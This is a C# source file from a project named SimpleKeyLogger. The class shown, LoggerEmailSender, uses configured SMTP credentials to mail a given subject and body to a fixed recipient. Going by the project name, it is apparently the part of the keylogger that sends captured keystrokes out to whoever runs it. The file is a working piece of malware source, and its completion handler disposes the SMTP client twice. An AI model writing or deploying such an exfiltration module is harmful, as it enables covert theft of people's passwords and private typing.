using SimpleKeyLogger.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace SimpleKeyLogger.EmailSender
{
    public class LoggerEmailSender
    {
        private SmtpClient _smtp;
        private MailMessage _mail;

        private readonly string _hostSmpt;
        private readonly bool _enableSsl;
        private readonly int _port;
        private readonly string _senderEmail;
        private readonly string _senderEmailPassword;
        private readonly string _senderName;
        private readonly string _recipientEmail;

        public LoggerEmailSender(AppConfig appConfig)
        {
            
            _hostSmpt = appConfig.ServerConfiguration.HostSmtp;
            _enableSsl = appConfig.ServerConfiguration.EnableSsl;
            _port = appConfig.ServerConfiguration.Port;
            _senderEmail = appConfig.SenderConfiguration.SenderEmail;
            _senderEmailPassword = appConfig.SenderConfiguration.SenderPassword;
            _senderName = appConfig.SenderConfiguration.SenderName;
            _recipientEmail = appConfig.RecipientEmail;

        }
        public async Task SendAsync(string subject, string body)
        {
            _mail = new MailMessage();
            _mail.From = new MailAddress(_senderEmail, _senderName);
            _mail.To.Add(new MailAddress(_recipientEmail));
            _mail.Subject = subject;
            _mail.BodyEncoding = Encoding.UTF8;
            _mail.SubjectEncoding = Encoding.UTF8;
            _mail.Body = body;

            _smtp = new SmtpClient
            {
                Host = _hostSmpt,
                EnableSsl = _enableSsl,
                Port = _port,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(_senderEmail, _senderEmailPassword)
            };
            _smtp.SendCompleted += OnSendCompleted;
            await _smtp.SendMailAsync(_mail);
        }

        private void OnSendCompleted(object sender, AsyncCompletedEventArgs e)
        {
            _smtp.Dispose();
            _smtp.Dispose();
        }
    }
}
